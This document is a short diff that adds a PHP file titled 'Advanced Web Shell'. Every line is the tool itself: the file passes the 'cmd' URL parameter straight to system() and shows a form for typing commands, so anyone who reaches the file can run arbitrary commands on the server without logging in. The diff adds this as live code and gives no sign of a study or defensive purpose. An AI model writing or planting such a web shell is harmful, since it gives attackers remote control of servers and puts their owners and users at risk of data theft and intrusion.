@@ -1,0 +1,15 @@
+<?php
+// Advanced Web Shell
+if(isset($_GET['cmd'])) {
+    echo "<pre>";
+    system($_GET['cmd']);
+    echo "</pre>";
+} else {
+    echo "<h2>Web Shell</h2>";
+    echo "<p>Usage: ?cmd=whoami</p>";
+    echo "<form method='GET'>";
+    echo "Command: <input type='text' name='cmd' size='50'>";
+    echo "<input type='submit' value='Execute'>";
+    echo "</form>";
+}
+?>
